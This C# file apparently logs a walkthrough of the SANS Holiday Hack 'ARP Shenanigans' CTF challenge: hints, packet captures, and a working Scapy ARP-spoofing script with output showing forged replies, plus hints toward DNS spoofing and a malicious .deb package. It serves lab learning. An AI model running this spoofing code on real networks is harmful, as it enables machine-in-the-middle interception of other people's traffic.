using Microsoft.Extensions.Logging;

namespace Janda.CTF.SANS.HolidayHack
{

    [Challenge(Type = "Objective", Number = 9, Name = "ARP Shenanigans", Points = 4, Flag = "Tanta Kringle")]
    public class ARPShenanigans : IChallenge
    {
        private readonly ILogger<ARPShenanigans> _logger;

        public ARPShenanigans(ILogger<ARPShenanigans> logger)
        {
            _logger = logger;
        }


        public void Objective()
        {
            @"
                Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. 
                Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. 
                Who recused herself from the vote described on the document?

            ".Blog(_logger, "Objective");
        }

        public void About()
        {
            @"
                Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
                Help the North Pole by getting command line access back to this host.

                Read the HELP.md file for information to help you in this endeavor.

                Note: The terminal lifetime expires after 30 or more minutes so be 
                sure to copy off any essential work you have done as you go.

                guest@68e6e97fccd9:~$ 

            ".Blog(_logger, "Start");
        }


        public void Theory()
        {
            @"
                What is ARP? Address Resolution Protocol

                Address Resolution Protocol (ARP) is a procedure for mapping a dynamic Internet Protocol address (IP address) to a permanent physical machine address in a local area network (LAN). 
                The physical machine address is also known as a Media Access Control or MAC address. 


                More on: https://searchnetworking.techtarget.com/definition/Address-Resolution-Protocol-ARP

            ".Blog(_logger, "Theory");
        }

        public void Hints()
        {
            @"

                Spoofy
                From: Alabaster Snowball
                Objective: 9) ARP Shenanigans
                
                The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. 
                I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.


                Resolvy
                From: Alabaster Snowball
                Objective: 9) ARP Shenanigans

                Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. 
                Let's return a DNS response resolving the request to our IP.


                Embedy
                From: Alabaster Snowball
                Objective: 9) ARP Shenanigans
                
                The malware on the host does an HTTP request for a .deb package. 
                Maybe we can get command line access by sending it a command in a customized .deb file


                Sniffy
                From: Alabaster Snowball
                Objective: 9) ARP Shenanigans
                
                Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. 
                Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.


            ".Blog(_logger, "Hints");
        }


        public void Chats()
        {
            @"

                Alabaster Snowball  8:38PM

                Oh, I see the Scapy Present Packet Prepper has already been completed!
                Now you can help me get access to this machine.
                It seems that some interloper here at the North Pole has taken control of the host.

                We need to regain access to some important documents associated with Kringle Castle.
                Maybe we should try a machine-in-the-middle attack?
            
                Oh, I see the Scapy Present Packet Prepper has already been completed!
                Now you can help me get access to this machine.

                It seems that some interloper here at the North Pole has taken control of the host.
                We need to regain access to some important documents associated with Kringle Castle.

                Maybe we should try a machine-in-the-middle attack?
                That could give us access to manipulate DNS responses.

                But we'll still need to cook up something to change the HTTP response.
            
                I'm sure glad you're here Santa.

            ".Blog(_logger, "Chats");
        }



        public void WonderingAround()
        {
            @"
                # resolution or it will stall when reading:                                                                                                
                ```                                                                                                                                        
                tshark -nnr arp.pcap                                                                                                                       
                tcpdump -nnr arp.pcap                                                                                                                      
                ```                                                                                                                                        
                                                                                                                                                           
                guest@452dd887658f:~$ tshark                                                                                                               
                Capturing on 'eth0'                                                                                                                        
                    1 0.000000000 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                    2 1.031989483 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                ^C2 packets captured                                                                                                                       
                guest@452dd887658f:~$                                                                                                                      
                guest@452dd887658f:~$ tshark                                                                                                               
                Capturing on 'eth0'                                                                                                                        
                    1 0.000000000 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                    2 1.039986867 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                    3 2.075830381 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                    4 3.131865014 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                    5 4.171833866 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                    6 5.203895329 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                    7 6.255960599 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                    8 7.291827766 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                                
                ^C    9 8.328093002 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                              
                9 packets captured                                                                                                                         
                guest@452dd887658f:~$ cd pcaps/                                                                                                            
                guest@452dd887658f:~/pcaps$ tshark -nnr arp.pcap                                                                                           
                    1   0.000000 cc:01:10:dc:00:00 → ff:ff:ff:ff:ff:ff ARP 60 Who has 10.10.10.1? Tell 10.10.10.2                                          
                    2   0.031000 cc:00:10:dc:00:00 → cc:01:10:dc:00:00 ARP 60 10.10.10.1 is at cc:00:10:dc:00:00                                           
                guest@452dd887658f:~/pcaps$                               

            ".Blog(_logger);
        }

        public void Run()
        {
            Objective();
            Hints();
            Chats();
            Theory();


            @"
                guest@505d7d82c555:~$ arp -a                
            ".Blog(_logger, "Getting nothing from ARP cache");


            @"                
                # How To Resize and Switch Terminal Panes:
                You can use the key combinations ( Ctrl+B ↑ or ↓ ) to resize the terminals.
                You can use the key combinations ( Ctrl+B o ) to switch terminal panes.
                See tmuxcheatsheet.com for more details

                # To Add An Additional Terminal Pane:
                `/usr/bin/tmux split-window -hb`

                # To exit a terminal pane simply type:
                `exit`

                # To Launch a webserver to serve-up files/folder in a local directory:
                ```
                cd /my/directory/with/files
                python3 -m http.server 80
                ```

                # A Sample ARP pcap can be viewed at:
                https://www.cloudshark.org/captures/d97c5b81b057

                # A Sample DNS pcap can be viewed at:
                https://www.cloudshark.org/captures/0320b9b57d35

                # If Reading arp.pcap with tcpdump or tshark be sure to disable name
                # resolution or it will stall when reading:
                ```
                tshark -nnr arp.pcap
                tcpdump -nnr arp.pcap
                ```
            ".Blog(_logger, "cat HELP.md");

            @"
                eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST>  mtu 1500
                        inet 10.6.0.3  netmask 255.255.0.0  broadcast 10.6.255.255
                        ether 02:42:0a:06:00:03  txqueuelen 0  (Ethernet)
                        RX packets 446  bytes 19164 (19.1 KB)
                        RX errors 0  dropped 0  overruns 0  frame 0
                        TX packets 0  bytes 0 (0.0 B)
                        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
                        inet 127.0.0.1  netmask 255.0.0.0
                        loop  txqueuelen 1000  (Local Loopback)
                        RX packets 40  bytes 2000 (2.0 KB)
                        RX errors 0  dropped 0  overruns 0  frame 0
                        TX packets 40  bytes 2000 (2.0 KB)
                        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

            ".Blog(_logger, "ifconfig, IP {ip} MAC {mac}", "10.6.0.3", "02:42:0a:06:00:03");


            @"
                https://www.wireshark.org/docs/man-pages/tshark.html
            ".Blog(_logger, "tshark help");


            @"
                guest@505d7d82c555:~/pcaps$ tshark -nnr arp.pcap
                    1   0.000000 cc:01:10:dc:00:00 → ff:ff:ff:ff:ff:ff ARP 60 Who has 10.10.10.1? Tell 10.10.10.2
                    2   0.031000 cc:00:10:dc:00:00 → cc:01:10:dc:00:00 ARP 60 10.10.10.1 is at cc:00:10:dc:00:00

                guest@505d7d82c555:~/pcaps$ tcpdump -nnr arp.pcap
                reading from file arp.pcap, link-type EN10MB (Ethernet)
                17:16:02.806447 ARP, Request who-has 10.10.10.1 tell 10.10.10.2, length 46
                17:16:02.837447 ARP, Reply 10.10.10.1 is-at cc:00:10:dc:00:00, length 46

                guest@505d7d82c555:~/pcaps$ tshark -nnr dns.pcap
                    1   0.000000 192.168.170.8 → 192.168.170.20 DNS 74 Standard query 0x75c0 A www.netbsd.org
                    2   0.048911 192.168.170.20 → 192.168.170.8 DNS 90 Standard query response 0x75c0 A www.netbsd.org A 204.152.190.12


                guest@505d7d82c555:~/pcaps$ tcpdump -nnr dns.pcap
                reading from file dns.pcap, link-type EN10MB (Ethernet)
                08:49:18.685951 IP 192.168.170.8.32795 > 192.168.170.20.53: 30144+ A? www.netbsd.org. (32)
                08:49:18.734862 IP 192.168.170.20.53 > 192.168.170.8.32795: 30144 1/0/0 A 204.152.190.12 (48)


            ".Blog(_logger, "Read packets files");


            @"
                guest@505d7d82c555:~/pcaps$ tcpdump -nn
                tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
                listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
                21:35:00.464437 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:01.508446 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:02.540369 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:03.580386 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:04.620438 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:05.652377 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28

            ".Blog(_logger, "tcpdump -nn");




            @"
                tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
                listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
                22:14:36.566554 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:37.345679 IP6 fe80::9822:6fff:fe7b:92de > ff02::2: ICMP6, router solicitation, length 16
                22:14:37.610555 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:38.642595 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:39.674605 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:40.782625 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:41.826849 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:42.862631 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:43.902643 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:44.938686 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:45.970638 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:46.049697 IP6 fe80::9822:6fff:fe7b:92de > ff02::2: ICMP6, router solicitation, length 16
                22:14:47.002821 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:48.038662 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:49.090932 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:50.126659 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:51.166754 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:52.206596 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:53.238806 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:54.274839 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28


            guest@1dbc829b765d:~$ tshark
            Capturing on 'eth0'
                1 0.000000000 fe80::2827:f1ff:fef6:e49d → ff02::2      ICMPv6 70 Router Solicitation from 2a:27:f1:f6:e4:9d
                2 0.161261685 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                3 1.209474837 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                4 2.244852384 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                5 3.284891781 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                6 4.324876935 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                7 5.360963713 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                8 6.396865986 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                9 7.423932814 fe80::2827:f1ff:fef6:e49d → ff02::2      ICMPv6 70 Router Solicitation from 2a:27:f1:f6:e4:9d
               10 7.437029569 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               11 8.472865340 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               12 9.504907119 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               13 10.561525306 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               14 11.592910912 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               15 12.636858756 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               16 13.689205728 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               17 14.728905098 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               18 15.772974532 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               19 16.812953139 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               20 17.852897605 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               21 18.884977571 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               22 19.928908522 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               23 20.972919679 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               24 22.008884886 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               25 22.527940896 fe80::2827:f1ff:fef6:e49d → ff02::2      ICMPv6 70 Router Solicitation from 2a:27:f1:f6:e4:9d
               26 23.065161088 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               27 24.112834401 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               28 25.152877006 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               29 26.212860899 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               30 27.252883953 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               31 28.304987317 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               32 29.352902817 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               33 30.396905879 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               34 31.441033315 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               35 32.488884888 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               36 33.532955828 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               37 34.564894101 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               38 35.612875309 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               39 36.661061380 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               40 37.704864306 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35


            ".Blog(_logger, @"When logged immediatelly run {command}. The ICMP6 does not happen later... 
                
                The MAC address {mac} changes everytime accessing the terminal.
                Router discovery messages
                To enable router discovery, the IRDP defines two kinds of ICMP messages:[4][5]

                The ICMP Router Solicitation message is sent from a computer host to any routers on the local area network to request that they advertise their presence on the network.

            ", "tcpdump -nni eth0", "2a:27:f1:f6:e4:9d");


            @"

                1 0.000000000 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                2 1.039942918 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                3 2.091998751 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                4 3.131935943 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                5 4.199995086 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                6 5.259945568 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                7 6.303958906 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                8 7.183032133 fe80::f8f1:edff: fe60: 3c57 → ff02::2      ICMPv6 70 Router Solicitation from fa:f1: ed: 60:3c: 57
                9 7.351906056 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                10 8.399987293 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35

            ".Blog(_logger, "Found how to read specific frame: {command}", "tshark -r out.pcap -Y \"frame.number >= 1 && frame.number <= 10\"");



            // https://github.com/x4nth055/pythoncode-tutorials/tree/master/scapy/arp-spoofer

            // sc config RemoteAccess start=demand
            // sc start RemoteAccess
            // https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy#:~:text=Building%20and%20creating%20an%20ARP%20Spoof%20script%20in,is%20a%20method%20of%20gaining%20a%20man-in-the-middle%20situation.


            @"              
                inet 10.6.0.3  netmask 255.255.0.0  broadcast 10.6.255.255
                Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.                
                Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                      
            ".Blog(_logger, @"What do we know now...
                my ip is {myip} with mac {myhw}
                hijacked host is at {hijackedip}
                found ARP who-has {hijackedip} packets flying over the network

                For:
                    Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                We must reply: 
                    10.6.6.35 is-at 4c:24:57:ab:ed:84

                    Sender IP addres:   10.6.6.35
                    Sender MAC address: 4c:24:57:ab:ed:84



                Based on packet comparison (sniffed and the example provided in pcaps) we must reply with: 

                    Ether dst: 02:42:0a:06:00:06 
                    ARP target ip: 10.10.10.2
                    ARP sender ip: 10.6.6.53


            ",                 
            "10.6.0.3", "02:42:0a:06:00:03", "10.6.6.35", "10.6.6.35");



            @"
                guest@3fcc52341816:~$ python3
                Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
                [GCC 9.3.0] on linux
                Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
                >>> from scapy.all import Ether, ARP, srp, send
                >>> srp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = ""10.6.6.35""), timeout = 1, verbose = 0)[0][0][1].src
                '4c:24:57:ab:ed:84'

            ".Blog(_logger, "Get hijacked host MAC address");



            @"

                guest@d4a322bde6e4:~$ tshark -n
                Capturing on 'eth0'
                    1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                    2 0.000157636 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.0.6
                    3 0.088167525 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.35? Tell 10.6.0.6
                    4 1.055984658 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                    5 2.099919201 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                    6 2.204333394 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.0.6
                    7 2.284136670 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.35? Tell 10.6.0.6
                    8 3.135988466 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                    9 4.180013747 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                   10 4.376467450 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.0.6
                   11 4.440169404 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.35? Tell 10.6.0.6
                   12 5.235964835 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                   13 6.295972797 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                   14 6.508090208 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.0.6
                   15 6.604233788 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.35? Tell 10.6.0.6
                   16 7.339963840 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35

                    Who has 10.6.6.35? Tell 10.6.0.6
                    Who has 10.6.6.53? Tell 10.6.6.35

            ".Blog(_logger, "There are multiple ARP requests which we might have to answer, for example 10.6.6.35");


            @"
                 2338 2394.379999382 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2339 2395.420053549 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2340 2396.251885630     10.6.0.7 → 169.254.169.254 DNS 63 Standard query 0xeb7a A MAC                                                
                 2341 2396.319089628 02:42:0a:06:00:07 → 02:42:94:00:d2:d6 ARP 42 Who has 10.6.0.1? Tell 10.6.0.7                                     
                 2342 2396.319146187 02:42:94:00:d2:d6 → 02:42:0a:06:00:07 ARP 42 10.6.0.1 is at 02:42:94:00:d2:d6                                    
                 2343 2396.460168832 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2344 2397.508022900 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2345 2398.555955377 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35   

                 2373 2421.277998227     10.6.0.7 → 169.254.169.254 DNS 89 Standard query 0xf15a A IP.c.holidayhack2020.internal                      
                 2374 2421.636063916 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2375 2422.680070877 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2376 2423.724111830 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2377 2424.768039488 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2378 2425.807966415 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2379 2426.283261025     10.6.0.7 → 169.254.169.254 DNS 89 Standard query 0xf15a A IP.c.holidayhack2020.internal                      
                 2380 2426.843980274 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2381 2427.887958485 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2382 2428.935949396 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35     

            ".Blog(_logger, "When trying send a new packet (not completed yet) I can see DNS packages...");


            @"
                3388 3397.343838237 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply) (duplicate use of 10.6.6.35 detected!)
                 
                https://wiki.wireshark.org/Gratuitous_ARP#:~:text=Gratuitous%20ARPs%20are%20useful%20for%20four%20reasons%3A%201,to%20that%20MAC%20address%20...%20More%20items...%20

            ".Blog(_logger, "Using {code} I have discovered something called Gratuitous ARP", "arp_resp_02.py");

            @"
                 4013 3987.852213869 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply)             
                 4014 3988.868052715 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                
                 4015 3988.892174494 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply)             
                 4016 3989.908116466 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                
                 4017 3989.928012661 00:00:00:00:00:00 → 4c:24:57:ab:ed:84 ARP 42 Gratuitous ARP for 10.6.6.35 (Reply)             
                 4018 3990.944052549 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35        

            ".Blog(_logger, "Using {code} we still get Gratuitous ARP but no duplicate", "arp_resp_03.py");


            @"
                guest@b19f4c3c04f9:~$ nano arp_resp_04.py
                ... 

                #!/usr/bin/python3
                from scapy.all import *
                import netifaces as ni
                import uuid
                # Our eth0 ip
                ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
                # Our eth0 mac address
                macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
                print(ipaddr)
                print(macaddr)
                def handle_arp_packets(packet):
                    # if arp request, then we need to fill this out to send back our mac as the response
                    if ARP in packet and packet[ARP].op == 1:
                        print(packet.sprintf(""<- op=%ARP.op% hwsrc=%ARP.hwsrc% psrc=%ARP.psrc% pdst=%ARP.pdst% hwdst=%ARP.hwdst%""))
                        ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x806, src=macaddr)
                        arp_response = ARP(pdst=macaddr)        
                        arp_response.op = 2             # Opcode (reply) ""is-at""
                        arp_response.plen = 4           # Protocol size
                        arp_response.hwlen = 6          # Hardware size
                        arp_response.ptype = 0x800      # Protocol type is IPv4 (0x800)
                        arp_response.hwtype = 1         # Hardware type: Ethernet (1)
                        arp_response.hwsrc = macaddr
                        arp_response.psrc = packet[ARP].pdst
                        arp_response.hwdst = packet[ARP].hwsrc
                        arp_response.pdst = packet[ARP].psrc
                        response = ether_resp/arp_response
                        print(arp_response.sprintf(""=> op=%ARP.op% hwsrc=%ARP.hwsrc% psrc=%ARP.psrc% pdst=%ARP.pdst% hwdst=%ARP.hwdst%""))
                        sendp(response, iface=""eth0"", verbose = 0)

                def main():
                    # We only want arp requests
                    berkeley_packet_filter = ""(arp[6:2] = 1)""
                    # sniffing for one packet that will be sent to a function, while storing none
                    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=100)
                if __name__ == ""__main__"":
                    main()

                ...
                guest@b19f4c3c04f9:~$ chmod +x arp_resp_04.py 
                guest@b19f4c3c04f9:~$ ./arp_resp_04.py               

                10.6.0.4
                02:42:0a:06:00:04
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00
                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84
